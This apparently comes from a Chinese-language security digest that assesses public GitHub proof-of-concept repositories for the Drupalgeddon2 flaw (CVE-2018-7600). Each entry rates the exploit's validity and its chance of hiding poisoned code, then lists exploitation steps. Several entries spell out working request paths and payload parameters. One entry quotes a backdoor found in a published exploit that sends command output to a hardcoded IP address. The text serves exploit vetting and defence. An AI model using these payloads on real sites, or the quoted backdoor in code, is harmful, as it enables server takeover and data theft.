提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
